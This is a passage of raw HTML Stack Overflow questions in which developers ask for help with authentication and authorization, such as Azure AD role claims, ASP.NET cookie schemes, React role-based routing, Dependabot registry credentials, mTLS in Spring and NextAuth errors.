builder.Services.AddMicrosoftIdentityWebAppAuthentication(builder.Configuration)
    .EnableTokenAcquisitionToCallDownstreamApi()
    .AddInMemoryTokenCaches();

builder.Services.AddAuthorization();

builder.Services.Configure&lt;OpenIdConnectOptions&gt;(OpenIdConnectDefaults.AuthenticationScheme, options =&gt;
{
    // Sets up the claim name which will be used by Authorize attribute
    options.TokenValidationParameters.RoleClaimType = &quot;roles&quot;; 
});
</code></pre>
<ol>
<li>My controller:</li>
</ol>
<pre><code>[ApiController]
[Route(&quot;[controller]&quot;)]
public class Test : ControllerBase
{
    [HttpGet(&quot;Reader&quot;)]
    [Authorize(Roles = &quot;Reader&quot;)]
    public IActionResult Reader() =&gt;
        Ok(&quot;Success&quot;)
}

</code></pre>
<ol>
<li>My appSettings.json</li>
</ol>
<pre><code>  &quot;AzureAd&quot;: {
    &quot;Instance&quot;: &quot;https://login.microsoftonline.com/&quot;,
    &quot;Domain&quot;: &quot;{mytenant}.onmicrosoft.com&quot;,
    &quot;TenantId&quot;: &quot;{tenantid}&quot;,
    &quot;ClientId&quot;: &quot;{AR client id}&quot;,
    &quot;ClientSecret&quot;: &quot;{AR client secret}&quot;,
    &quot;Scopes&quot;: &quot;access_as_user&quot;,
    &quot;CallbackPath&quot;: &quot;/signin-oidc&quot;
  },
</code></pre>
<p>Now when I deploy this app to app service, for the user Accessing Reader controller is working as expected.</p>
<p>I also created claims controller:</p>
<pre><code>        [HttpGet(&quot;GetClaims&quot;)]
        public IActionResult GetClaims()
        {
            var sb = new System.Text.StringBuilder(&quot;Claims:\r\n\r\n&quot;);
            User.Claims.ToList().ForEach(_ =&gt; sb.AppendLine($&quot;Key: '{_.Type}'\tValue: '{_.Value}'&quot;));
            sb.AppendLine();
            sb.AppendLine(&quot;\r\n\r\nHeaders:\r\n\r\n&quot;);
            ClaimsPrincipal.Current?.Claims.ToList().ForEach(_ =&gt; sb.AppendLine($&quot;Type: '{_.Type}'\tSubject: '{_.Subject}'\tIssuer: '{_.Issuer}'\tValueType: '{_.ValueType}'\tValue: '{_.Value}'&quot;));
            return Ok(sb.ToString());
        }
</code></pre>
<p>And for the user I can see roles coming up from the claim:
<a href=""https://i.stack.imgur.com/vo8Uy.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/vo8Uy.png"" alt=""Claims for the user"" /></a></p>
<p>But when I try to access it with service principal (for example via logic app), it gives me empty claims, what means that authorization is also not working, while accessing <code>Reader</code> controller:</p>
<p><a href=""https://i.stack.imgur.com/ieQXv.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ieQXv.png"" alt=""Service principal claims"" /></a></p>
<p>I believe I am missing something small in here and it would be hard to believe MS did not implemented service principal authorization based on roles.</p>
<p>As other workaround I believe I would create a middleware to map claims from the token for service principals, but I would really like to avoid this if possible.</p>
"
"<p>I am currently testing a controller using the xUnit framework. Here is the method I am testing:</p>
<pre class=""lang-cs prettyprint-override""><code>[Authorize(Roles = nameof(Roles.Administrator))]
[HttpGet]
public async Task&lt;ActionResult&lt;IEnumerable&lt;AddressDTO&gt;&gt;&gt; GetAllAddresses()
{
  IEnumerable&lt;AddressDTO&gt; addresses = await _addressService.GetAllAddressesAsync();
  return Ok(addresses);
}
</code></pre>
<p>The goal of the test I want to perform is to verify that an authenticated user indeed holds the &quot;Administrator&quot; role. If not, the test should fail.</p>
<p>I have attempted several methods:</p>
<p>The first one involves mocking the Service as well as the Controller by specifying a context for it:</p>
<pre class=""lang-cs prettyprint-override""><code>[Fact]
public async Task GetAllAddresses_NonAdministrator_Returns_Forbidden()
{
    // Arrange
    var addressServiceMock = new Mock&lt;IAddressService&gt;();
    var controller = new AddressController(addressServiceMock.Object);

    var claims = new List&lt;Claim&gt;
        {
            new Claim(ClaimTypes.Name, &quot;userId&quot;),
            new Claim(ClaimTypes.Role, nameof(Roles.User))
        };
    var identity = new ClaimsIdentity(claims, &quot;TestAuthType&quot;);
    var user = new ClaimsPrincipal(identity);
    controller.ControllerContext = new ControllerContext
    {
        HttpContext = new DefaultHttpContext { User = user }
    };

    // Act
    var result = await controller.GetAllAddresses();

    // Assert
    Assert.IsType&lt;ForbidResult&gt;(result.Result);
}
</code></pre>
<p>The issue here is that the context is not being considered, and the test runs without taking into account the existence of the [Authorize(Roles = nameof(Roles.Administrator))] attribute.</p>
<p>One of the other method I tried is setting up a mock of an HTTP client using WebApplicationFactory to simulate a request and thus trigger the attribute, which works. However, the problem with this solution is that my test becomes dependent on a database, which I do not want.</p>
<p>Is there a solution to my problem? Am I testing in the wrong way, or should I stick to tests that involve a database?</p>
<p>Thanks in advance for your help!</p>
"
"<p>I have two schemes as follows:</p>
<pre><code>    builder.Services.AddAuthentication(option =&gt;
{
    option.DefaultSignInScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    option.DefaultAuthenticateScheme = CookieAuthenticationDefaults.AuthenticationScheme;
    option.DefaultChallengeScheme = CookieAuthenticationDefaults.AuthenticationScheme;
}).AddCookie(option =&gt; // Admins' Scheme
{
    option.LoginPath = new PathString(&quot;/admin/auth/login&quot;);
    option.ExpireTimeSpan = TimeSpan.FromMinutes(1);
    option.AccessDeniedPath = new PathString(&quot;/&quot;);
}).AddCookie(&quot;user&quot;, option =&gt; // Users' Scheme
{
    option.LoginPath = new PathString(&quot;/&quot;);
    option.ExpireTimeSpan = TimeSpan.FromMinutes(1);
    option.AccessDeniedPath = new PathString(&quot;/&quot;);
});
</code></pre>
<p>There are two ways to access the login functionality for users: admin and ordinary users.</p>
<p>For admins:</p>
<pre><code>[HttpPost]
    public IActionResult Login(RequestAuthLoginUsersServiceDto req)
    {
        var login = _userFacade.AuthLoginUsersService.Execute(req);
        if (login != null)
        {
            if (login.IsSuccess)
            {
                var claims = new List&lt;Claim&gt;() {
                    new Claim(ClaimTypes.NameIdentifier,login.Data.IdUser.ToString()),
                    new Claim(ClaimTypes.Email,req.Email),
                    new Claim(ClaimTypes.Name,login.Data.Nickname),
                    new Claim(ClaimTypes.Role,login.Data.Role),
                };

                var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var principal = new ClaimsPrincipal(identity);
                var propertise = new AuthenticationProperties()
                {
                    IsPersistent = true,
                    ExpiresUtc = DateTime.Now.AddYears(1),
                };
                _userLoginLogFacade.PostUserLoginLogService.Execute(new RequestPostUserLoginLogServiceDto
                {
                    UsersId = login.Data.IdUser,
                    IP = Request.HttpContext.Connection.RemoteIpAddress.ToString(),
                });
                HttpContext.SignInAsync(principal, propertise);
            }
        }
        return Json(login);
    }
</code></pre>
<p>user:</p>
<pre><code>[HttpPost]
    public IActionResult Login(RequestAuthLoginUsersServiceDto req)
        {
        var login = _userFacade.AuthLoginUsersService.Execute(req);
        if (login != null)
        {
            if (login.IsSuccess)
            {
                var claims = new List&lt;Claim&gt;() {
                    new Claim(ClaimTypes.NameIdentifier,login.Data.IdUser.ToString()),
                    new Claim(ClaimTypes.Email,req.Email),
                    new Claim(ClaimTypes.Name,login.Data.Nickname),
                    new Claim(ClaimTypes.Role,login.Data.Role),
                };

                // var identity = new ClaimsIdentity(claims, CookieAuthenticationDefaults.AuthenticationScheme);
                var identity = new ClaimsIdentity(claims, &quot;user&quot;);
                var principal = new ClaimsPrincipal(identity);
                var propertise = new AuthenticationProperties()
                {
                    IsPersistent = true,
                    ExpiresUtc = DateTime.Now.AddYears(1),
                };
                _userLoginLogFacade.PostUserLoginLogService.Execute(new RequestPostUserLoginLogServiceDto
                {
                    UsersId = login.Data.IdUser,
                    IP = Request.HttpContext.Connection.RemoteIpAddress.ToString(),
                });
                HttpContext.SignInAsync(
                    &quot;user&quot;,
                    principal,
                    propertise);
            }
        }
</code></pre>
<p>The problem is that when a user logs in, &quot;User.Identity.IsAuthenticated&quot; returns &quot;false&quot;. However, when an admin logs in, the same code returns &quot;true&quot;. It is important to note that if I use &quot;[Authorize(AuthenticationSchemes = &quot;user&quot;)]&quot;, the code returns &quot;true&quot; for the user. However, for the default mode (admin way), the &quot;[Authorize(AuthenticationSchemes = &quot;user&quot;)]&quot; is not needed.</p>
"
"<p>In the frontend, in case of get req /api/v1/users/chats it's request headers section-</p>
<pre><code>GET /api/v1/users/chats HTTP/1.1
Host: localhost:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:5173/
Origin: http://localhost:5173
Connection: keep-alive
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
</code></pre>
<p>and in case of post req /api/v1/prompts/create that is -</p>
<pre><code>POST /api/v1/prompts/create HTTP/1.1
Host: localhost:4000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------155569911418215713223055054392
Content-Length: 10637
Origin: http://localhost:5173
Connection: keep-alive
Referer: http://localhost:5173/
Cookie: token=eyJhbGciOiJIUzI1NiCI6IkpXVCJ9.eyJpZCI6IjY1YzlmNzliNjlmNGQ4OTJkZjc4OSIsImlhdCI6MTwMTk2NywiZXhwIjoxNzA5MjA2NzY3fQ.ZQHlb8eL5MfArxTwJBKxFpI764W_VipAmNN4NMkPwIQ
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
</code></pre>
<p>then why am i facing the problem of not getting cookie part in the req header of /chats endpoint?
I am getting perfect results in the postman. Both of those paths use &quot;isAuthorized&quot; middleware. In client side i am getting error not authorized for &quot;/api/v1/users/chats&quot; but the other path is perfectly working since its getting cookies in its request header</p>
<p>In client side, the &quot;get /api/v1/users/chats&quot; path must run as expected and there must be a cookie section in the request header, just like &quot;post /prompts/create&quot; path</p>
"
"<p>I'm facing a problem to give authorization to the users based on their roles, the users are admin, patient, doctor, and hospital. I'm done with the authentication and any user can login in into the system with his username and password. Also, I'm handling the validation. Now I want to redirect the user based on his username for example ( if username === 'doctor' -&gt; Navigate to  else if username === 'patient' Navigate to  (RootLayout is a wrap component it has the navbar at the top and under it is the  where the child routes should be rendered else if username === 'admin' Navigate to  else if username === 'hospital' Navigate to  )
Also the problem is that someone told me that I can't do it with role based because the backend has more than one schema so I can not use this method.
Could anyone help me to find a way to give authorization to the users?</p>
<p>I don't know how to do it but I've done many search on it and I found 2 approaches which are ContextAPI and Role-Based but I couldn't do it</p>
<p>here is the code:</p>
<p>App.jsx</p>
<pre><code>import { createBrowserRouter, RouterProvider } from &quot;react-router-dom&quot;;
import RootLayout from &quot;./root/RootLayout&quot;;
import Home from &quot;./pages/Home&quot;;
import Error from &quot;./Error/Error&quot;;
import ContactUs from &quot;./pages/ContactUs.jsx&quot;;
import NewLogin from &quot;./pages/NewLogin.jsx&quot;;
import { loader as tokenLoader } from &quot;./util/auth.js&quot;;
import { action as authAction } from &quot;./pages/NewLogin.jsx&quot;;
import { action as logoutAction } from &quot;./pages/Logout.js&quot;;
import Nutrition from &quot;./health/Nutrition.jsx&quot;;
import HealthAwareness from &quot;./health/HealthAwareness.jsx&quot;;

const router = createBrowserRouter([
  {
    path: &quot;/&quot;,
    element: &lt;RootLayout /&gt;,
    errorElement: &lt;Error /&gt;,
    id: &quot;root&quot;,
    loader: tokenLoader,
    children: [
      { path: &quot;&quot;, element: &lt;Home /&gt; },
      { path: &quot;health-awareness&quot;, element: &lt;HealthAwareness /&gt; },
      { path: &quot;ca&quot;, element: &lt;Nutrition /&gt; },
      { path: &quot;contact-us&quot;, element: &lt;ContactUs /&gt; },
      { path: &quot;logout&quot;, action: logoutAction },
    ],
  },
  { path: &quot;login&quot;, element: &lt;NewLogin /&gt;, action: authAction },
]);

export default function App() {
  return &lt;RouterProvider router={router} /&gt;;
}
</code></pre>
<p>RootLayout.jsx</p>
<pre><code>import { Outlet } from &quot;react-router-dom&quot;;

import NewNavbar from &quot;../components/NewNavbar.jsx&quot;;

export default function RootLayout() {
  return (
    &lt;&gt;
      &lt;NewNavbar /&gt;
      &lt;main&gt;
        &lt;Outlet /&gt;
      &lt;/main&gt;
    &lt;/&gt;
  );
}
</code></pre>
<p>Authentication handling is in NewLogin.jsx</p>
<pre><code>import { json, redirect } from &quot;react-router-dom&quot;;
import LoginForm from &quot;../components/LoginForm&quot;;

export async function action({ request }) {
  const data = await request.formData();
  const authData = {
    username: data.get(&quot;username&quot;),
    password: data.get(&quot;password&quot;),
  };

  const response = await fetch(&quot;http://localhost:3000/auth/login&quot;, {
    method: &quot;POST&quot;,
    headers: {
      &quot;Content-Type&quot;: &quot;application/json&quot;,
    },
    body: JSON.stringify(authData),
  });

  if (response.status === 400) {
    return response;
    //throw json({ message: &quot;invalid data&quot; }, { status: 400 });
  }

  if (!response.ok) {
    throw json(
      { message: &quot;Could not authenticate this user.&quot; },
      { status: 400 }
    );
  }

  const resData = await response.json();
  const token = resData.token;

  localStorage.setItem(&quot;token&quot;, token);
  console.log(token);
  return redirect(&quot;/&quot;);
}
</code></pre>
<p>auth.js</p>
<pre><code>export function getAuthToken() {
    const token = localStorage.getItem('token');
    return token;
}

export function loader() {
    return getAuthToken();
}
</code></pre>
<p>Logout.js</p>
<pre><code>import { redirect } from &quot;react-router-dom&quot;;

export function action() {
    localStorage.removeItem('token');
    return redirect('/');
}
</code></pre>
<p>NewNavbar.jsx</p>
<pre><code> function logoutHandler() {
    const proceed = window.confirm(&quot;Are you sure؟&quot;);

    if (proceed) {
      submit(null, { action: &quot;/logout&quot;, method: &quot;post&quot; });
    }
  }

const token = useRouteLoaderData(&quot;root&quot;);  

//inside the navbar
 {!token &amp;&amp; (
            &lt;li
              className={`hidden md:block list-none text-[23px] p-6 hover:animate-pulse ${
                isScrolled ? &quot;text-emerald-800&quot; : &quot;text-slate-100&quot;
              }`}
            &gt;
              &lt;NavLink to=&quot;/login&quot;&gt;login&lt;/NavLink&gt;
            &lt;/li&gt;
          )}
          {token &amp;&amp; (
            &lt;li
              className={`hidden md:block list-none text-[23px] hover:animate-pulse p-6 ${
                isScrolled ? &quot;text-emerald-800&quot; : &quot;text-slate-100&quot;
              }`}
            &gt;
              &lt;Form action=&quot;/logout&quot; method=&quot;post&quot;&gt;
                &lt;button onClick={logoutHandler}&gt;logout&lt;/button&gt;
              &lt;/Form&gt;
            &lt;/li&gt;
          )}
</code></pre>
"
"<p>I am trying to authorize Dependabot for a private npm package repository stored in the Google Cloud Artifact registry with basic authentication. I created a Service Account and provided repository level read permissions by assigning the <a href=""https://cloud.google.com/artifact-registry/docs/access-control#roles"" rel=""nofollow noreferrer"">Artifact Registry Reader</a> role.</p>
<p>The <code>.github/dependabot.yml</code> looks like this:</p>
<pre class=""lang-yaml prettyprint-override""><code>version: 2
registries:
  my-reg:
    type: npm-registry
    url: &lt;my repo url&gt;
    username: &quot;_json_key_base64&quot;
    password: &quot;${{ secrets.KEY_BASE64}}&quot;

updates:
  - package-ecosystem: &quot;npm&quot;
    registries:
      - my-reg
[...]
</code></pre>
<p>where <code>secrets.KEY_BASE64</code> is the base64 encoded service account key stored as a Dependabot Secret in GitHub (following <a href=""https://docs.github.com/en/code-security/dependabot/working-with-dependabot/configuring-access-to-private-registries-for-dependabot#storing-credentials-for-dependabot-to-use"" rel=""nofollow noreferrer"">the official documentation</a>).<br />
I got some information about the authentication process from this <a href=""https://stackoverflow.com/a/75608265/23422825"">StackOverflow Answer</a> and <a href=""https://cloud.google.com/artifact-registry/docs/docker/authentication#json-key"" rel=""nofollow noreferrer"">this docker KEY_TYPE example</a>.</p>
<p>I also tried this without the base64 encoding (<code>username: &quot;_json_key&quot;</code>) but the error is still the same: <code>{&quot;error&quot;:&quot;The caller does not have permission.&quot;}</code>.</p>
<p>When I use a temporary token instead of the permanent secret key it works until the token expires:</p>
<pre class=""lang-yaml prettyprint-override""><code>[...]
  my-reg:
    type: npm-registry
    url: &lt;my repo url&gt;
    token: &lt;my temp token&gt;
[...]
</code></pre>
<p>When trying to access it with curl I noticed a similar behaviour. When a token is generated it works:</p>
<pre><code>curl -H &quot;Authorization: Bearer $(gcloud auth print-access-token)&quot; &lt;url&gt;
</code></pre>
<p>but if I try using basic auth:</p>
<pre><code>curl -u _json_key:&lt;unencoded_secret_key&gt; &lt;url&gt;
</code></pre>
<p>or with base64 encoding:</p>
<pre><code>curl -u _json_key_base64:&lt;encoded_secret_key&gt; &lt;url&gt;
</code></pre>
<p>it does not work and results in the error: <code>{&quot;error&quot;:&quot;The caller does not have permission.&quot;}</code>. In both cases I removed all whitespace characters from the service account key.</p>
<p>Even with a <code>.npmrc</code> inside the root of the repository (where <code>package.json</code> is located), like mentioned <a href=""https://docs.github.com/en/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot#:%7E:text=The%20npm%20ecosystem%20requires%20a%20.npmrc%20file%20with%20the%20private%20registry%20URL%20to%20be%20checked%20into%20the%20repository."" rel=""nofollow noreferrer"">here in the dependabot documentation</a>, it still does not work:</p>
<pre><code>@my-reg:registry=&lt;url&gt;
</code></pre>
<p>I tried using a temporary token (works, but unwanted since the token is temporary).<br />
I tried using <code>_json_key</code> username with the unendcoded service account key (does not work).<br />
I tried using <code>_json_key_base64</code> username with the base64 encoded service account key (does not work).<br />
I tried adding the above <code>.npmrc</code> file (does not work).</p>
<p>How can I provide a permanent solution for the Dependabot to authenticate to out private npm registry?</p>
"
"<p>I don't need to do any validation over users, etc. I only need that the client send the certificate and the server (me in this case) validate the certificate through truststore or something (apply mTLS in other words).</p>
<p>I have one endpoint, lets say &quot;/authentication&quot;, that need to be mTLS, the other ones only need server auth (TLS).</p>
<p>This is a possible solution, I haven't tried it yet, but I think there's a even easier approach</p>
<p><a href=""https://stackoverflow.com/questions/76187946/how-to-guard-some-endpoints-with-mtls-and-some-with-jwt/78030895#78030895"">How to guard some endpoints with mTLs and some with JWT</a></p>
<p>For more context if helps, its for 3DS EMVCO</p>
<p>UPDATED STATUS:
made a filter which validates if the request contains at least one certificate.
Combine the filter with ssl.client-auth WANT for a specific route.
(With WANT the certificate will be validated throught truststore)</p>
<p>This is the filter if someone asks:</p>
<pre><code>    @Suppress(&quot;UNCHECKED_CAST&quot;)
override fun doFilterInternal(
    request: HttpServletRequest,
    response: HttpServletResponse,
    filterChain: FilterChain
) {
    try {
        if (isMutualTLSEnabled()) {
            val certificates: Array&lt;X509Certificate&gt;? = request
                .getAttribute(&quot;jakarta.servlet.request.X509Certificate&quot;) as Array&lt;X509Certificate&gt;?
            if (certificates.isNullOrEmpty()) {

                throw CertificateException()
            }
        }
        filterChain.doFilter(request, response)
    } catch (e: CertificateException) {
        resolver?.resolveException(request, response, null, e)
    }
}
</code></pre>
<p>If you find some solution like this:
<a href=""https://stackoverflow.com/questions/70589592/implement-both-mtls-two-way-ssl-and-public-endpoints-no-ssl-check"">Implement both mTLS (two way SSL ) and public endpoints (no SSL check)</a>
Is <strong>NOT</strong> what i need, this solution is for <strong>authenticated users</strong>, i will not perform any authentication over USERS</p>
"
"<p>I use the npm model &quot;serverless-mysql&quot; together with NextJS to send a request in my middleware to authorize my user to my database.
However, I get this error when a user logs in:</p>
<pre><code>Error: TypeError: Cannot read properties of undefined (reading 'slice')
    at Object.connect (webpack-internal:///(middleware)/./node_modules/serverless-mysql/index.js:97:23)
    at async isSessionValid (webpack-internal:///(middleware)/./src/lib/db.ts:100:5)
    at async isAuthenticated (webpack-internal:///(middleware)/./src/lib/auth.ts:18:10)
</code></pre>
<p>I have already modified the module myself and tried to debug it, but unfortunately without success.</p>
<p>This is my middleware.ts:</p>
<pre><code>import {NextRequest, NextResponse} from &quot;next/server&quot;;
import {isAuthenticated} from &quot;@/lib/auth&quot;;

export function middleware(request: NextRequest) {
    if(!isAuthenticated()) {
        NextResponse.redirect(&quot;/login&quot;);
    } else {
        return request;
    }
}
</code></pre>
<p>This is my auth.ts:</p>
<pre><code>

export async function isAuthenticated() {
    if (!cookies().has(&quot;sessionId&quot;)) {
        return false;
    }
    if (!await isSessionValid(cookies().get(&quot;sessionId&quot;)?.value || &quot;&quot;)) {
        return false;
    }

    return await getUserBySessionId(cookies().get(&quot;sessionId&quot;)?.value || &quot;&quot;) !== null;
}
</code></pre>
<p>And these are my database functions:</p>
<pre><code>export async function isSessionValid(sessionId: string) {
    await mysql.connect();
    let results;
    try {
        results = await mysql.query(
            `SELECT * FROM sessions WHERE id = ?`,
            [sessionId]
        );
        console.log(results);
    } catch (e: any) {
        throw new Error(&quot;Error executing query: &quot; + e.message);
    }
    await mysql.end();
    return results &amp;&amp; results.length &gt; 0;
}

export async function getUserBySessionId(sessionId: string) {
    await mysql.connect().catch(() =&gt; {
        throw new Error(&quot;Error connecting to MySQL&quot;);
    });
    const results = await mysql.query(
        `SELECT users.*
        FROM users 
        JOIN sessions ON users.id = sessions.user_id 
        WHERE sessions.id = ?`,
        [sessionId]
    );
    await mysql.end();
    if (results.length === 0) {
        return null;
    }
    return new User(results[0].name, results[0].role);
}

</code></pre>
"
"<p>In my application I've a problem with the login system. I'm done with the authentication, but I've 4 different users (patient, doctor, admin, hospital), I want to give authorization based on the user value. if the user === 'doctor' -&gt; Navigate to='/doctor-dashboard', and so on. my question here is how to give authorization to each user after he logs in</p>
<p>I don't know how to give authorization, but I'm using react-router-dom v6.21.1</p>
"
"<p>I have a custom Ldap Authentication provider which is not called during my tests due to the mocks(I think). Is there any way to write junit testcases for Authentication provider implementation? Test passes but custom authentication provider configured in security configuration is not called!</p>
<p><strong>Spring config:</strong></p>
<pre><code>@Configuration
@EnableWebSecurity
@RequiredArgsConstructor
public class SecurityConfiguration {

    @Autowired
    private final LdapAuthenticationProvider ldapAuthenticationProvider;

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.csrf(AbstractHttpConfigurer::disable)
        .cors(httpSecurityCorsConfigurer -&gt; httpSecurityCorsConfigurer.configurationSource(corsConfigurationSource()))
        .authorizeHttpRequests(request -&gt; request.requestMatchers(&quot;/api/v1/4g/**&quot;)
                .permitAll().anyRequest().authenticated())
            .sessionManagement(manager -&gt; manager.sessionCreationPolicy(STATELESS));
        return http.build();
    }
    
    @Bean
    AuthenticationManager authenticationManager(
        AuthenticationConfiguration authenticationConfiguration) throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }

    @Autowired
    void registerProvider(AuthenticationManagerBuilder auth) {
        auth.authenticationProvider(ldapAuthenticationProvider);
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new BCryptPasswordEncoder();
    }    
}
</code></pre>
<p><strong>Authentication provider:</strong></p>
<pre><code>public class LdapAuthenticationProvider implements AuthenticationProvider{
    @Override
    public Authentication authenticate(Authentication authentication) throws AuthenticationException {
        String username = authentication.getName();
        String password = authentication.getCredentials().toString();
        ... SOME AUTHENTICATION LOGIC HERE ...
        return authenticated;
    }

    @Override
    public boolean supports(Class&lt;?&gt; authentication) {
        return authentication.equals(UsernamePasswordAuthenticationToken.class);
    }

}
</code></pre>
<p><strong>JUnit Test</strong></p>
<pre><code>@ExtendWith(SpringExtension.class)
@WebMvcTest(controllers = LoginController.class)
@Import(LoginController.class)
@AutoConfigureMockMvc
@ContextConfiguration(classes = {Application.class})
public class LdapAuthenticationProviderTest {
    @InjectMocks
    private LoginController loginController;
    @Autowired
    private MockMvc mockMvc;

    private static final String USERNAME = &quot;username&quot;;
    private static final String PASSWORD = &quot;password&quot;;
    @TestConfiguration
    static class AdditionalConfig {
        @Bean
        public LdapAuthenticationProvider ldapProvider() {
            return new LdapAuthenticationProvider();
        }
    }
    @BeforeEach
    void init(){
        InternalResourceViewResolver viewResolver = new InternalResourceViewResolver();
        viewResolver.setPrefix(&quot;/4gapp/&quot;);
        MockitoAnnotations.openMocks(loginController);
        mockMvc = MockMvcBuilders
                .standaloneSetup(loginController)
                .setViewResolvers(viewResolver)
                .alwaysDo(print())
                .build();
    }
    @Test
    public void ldapAuthProviderTest() throws Exception {
        ObjectMapper objectMapper = new ObjectMapper();

        mockMvc.perform(post(&quot;/api/v1/4g/login&quot;)
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(objectMapper.writeValueAsString(request)))
                .andExpect(status().isOk())
                .andReturn();
    }
}
</code></pre>
"
"<p>These were my files and i used nextjs, prisma supabase, server actions i tried to auth bby watching this video <a href=""https://www.youtube.com/watch?v=1MTyCvS05V4&amp;t=6741s&amp;ab_channel=CodeWithAntonio"" rel=""nofollow noreferrer"">https://www.youtube.com/watch?v=1MTyCvS05V4&amp;t=6741s&amp;ab_channel=CodeWithAntonio</a>. i tried console the the code it shows the error ikm which crypto error please help me solve this problem or any other solution server</p>
<p>auth.config.ts</p>
<pre><code>import type { NextAuthConfig } from &quot;next-auth&quot;
import { getUserByEmail } from &quot;./data/user&quot;;
import { LoginSchema } from &quot;./schemas&quot;;
import bcrypt from &quot;bcryptjs&quot;;
import Credentials from &quot;next-auth/providers/credentials&quot;;

export default {
  providers: [ 
    Credentials({
      async authorize(credentials) {
        const validatedFields = LoginSchema.safeParse(credentials);

        if (validatedFields.success) {
          const { email, password } = validatedFields.data;
          
          const user = await getUserByEmail(email);
          if (!user || !user.password) return null;

          const passwordsMatch = await bcrypt.compare(
            password,
            user.password,
          );
          if (passwordsMatch) return user;
        }
        return null;
      }
    })
  ],
} satisfies NextAuthConfig
</code></pre>
<p>auth.ts</p>
<pre><code>import NextAuth from &quot;next-auth&quot;
import authConfig from &quot;./auth.config&quot;;
import { PrismaAdapter } from &quot;@auth/prisma-adapter&quot;
import { db } from &quot;./lib/db&quot;;
import { getUserById } from &quot;./data/user&quot;;
import { UserRole } from &quot;@prisma/client&quot;;

export const {
  handlers: { GET, POST },
  auth,
  signIn,
  signOut,
} = NextAuth({
  callbacks: {
    async session({ token, session }) {
      if (token.sub &amp;&amp; session.user) {
        session.user.id = token.sub;
      }

      if (token.role &amp;&amp; session.user) {
        session.user.role = token.role as UserRole;
      }
      return session
    },

    async jwt({ token }) {
      if (!token.sub) return token;

      const existingUser = await getUserById(token.sub);

      if (!existingUser) return token;

      return token
  },
},
  adapter: PrismaAdapter(db),
  session: { strategy: &quot;jwt&quot;},
  ...authConfig,
});
</code></pre>
<p>Login form</p>
<pre><code>&quot;use client&quot;

import React, { useState, useTransition } from 'react'
import { CardWrapper } from './card-wrapper'
import * as z from &quot;zod&quot;;
import { useForm } from &quot;react-hook-form&quot;;
import { zodResolver } from &quot;@hookform/resolvers/zod&quot;;
import { LoginSchema } from &quot;@/schemas&quot;
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '../ui/form';
import { Input } from '../ui/input';
import { Button } from '../ui/button';
import { FormError } from '../form-error';
import { FormSuccess } from '../form-success';
import { login } from '@/action/login';

const LoginForm = () =&gt; {
  const [error, setError] = useState&lt;string | undefined&gt;(&quot;&quot;)
  const [success, setSuccess] = useState&lt;string | undefined&gt;(&quot;&quot;)
  const [isPending, startTransition] = useTransition();

  const form = useForm&lt;z.infer&lt;typeof LoginSchema&gt;&gt;({
    resolver: zodResolver(LoginSchema),
    defaultValues: {
      email: &quot;&quot;,
      password: &quot;&quot;
    },
  })

  const onSubmit = (values: z.infer&lt;typeof LoginSchema&gt;) =&gt; {
    setError(&quot;&quot;)
    setSuccess(&quot;&quot;)

    startTransition(() =&gt; {
      login(values)
        .then((data) =&gt; {
          setError(data.error);  // &quot;data is possible 'undefined'&quot;
          setSuccess(data.success); // &quot;data is possible 'undefined'&quot;

        })
    })
    
  }

  console.log(onSubmit)


  return (
    &lt;CardWrapper
     headerLabel=&quot;welcome back&quot;
     backButtonLabel=&quot;Don't have an account?&quot;
     backButtonHref=&quot;/auth/register&quot;
     showSocial
    &gt;
        &lt;Form {...form}&gt;
           &lt;form 
              onSubmit={form.handleSubmit(onSubmit)}
              className=&quot;space-y-6&quot;
              &gt;
                &lt;div className=&quot;space-y-4&quot;&gt;
                  &lt;FormField 
                    control={form.control}
                    name=&quot;email&quot;
                    render={({ field }) =&gt; (
                      &lt;FormItem&gt;
                            &lt;FormLabel className=&quot;text-lg px-1&quot;&gt;Email&lt;/FormLabel&gt;
                            &lt;FormControl&gt;
                              &lt;Input 
                                {...field}
                                disabled={isPending}
                                placeholder=&quot;example@example.com&quot;
                                type=&quot;email&quot;
                                className=&quot;text-lg&quot;
                              /&gt;
                            &lt;/FormControl&gt;
                            &lt;FormMessage /&gt;
                          &lt;/FormItem&gt;
                    )}
                  /&gt;
                  &lt;FormField 
                    control={form.control}
                    name=&quot;password&quot;
                    render={({ field }) =&gt; (
                      &lt;FormItem&gt;
                            &lt;FormLabel className=&quot;text-lg px-1&quot;&gt;Password&lt;/FormLabel&gt;
                            &lt;FormControl&gt;
                              &lt;Input 
                                {...field}
                                disabled={isPending}
                                placeholder=&quot;Pass@123&quot;
                                type=&quot;password&quot;
                              /&gt;
                            &lt;/FormControl&gt;
                            &lt;FormMessage /&gt;
                          &lt;/FormItem&gt;
                    )}
                  /&gt;
                &lt;/div&gt;
                &lt;FormError message={error} /&gt;
                &lt;FormSuccess message={success} /&gt;
                &lt;Button
                disabled={isPending}
                 type=&quot;submit&quot;
                 className=&quot;w-full text-xl&quot;
                &gt;
                  Login
                &lt;/Button&gt;
           &lt;/form&gt;
        &lt;/Form&gt;
    &lt;/CardWrapper&gt;
  )
}

export default LoginForm
</code></pre>
<p>terminal log</p>
<pre><code>[auth][error] CallbackRouteError: Read more at https://errors.authjs.dev#callbackrouteerror
[auth][cause]: TypeError: &quot;ikm&quot;&quot; must be an instance of Uint8Array or a string
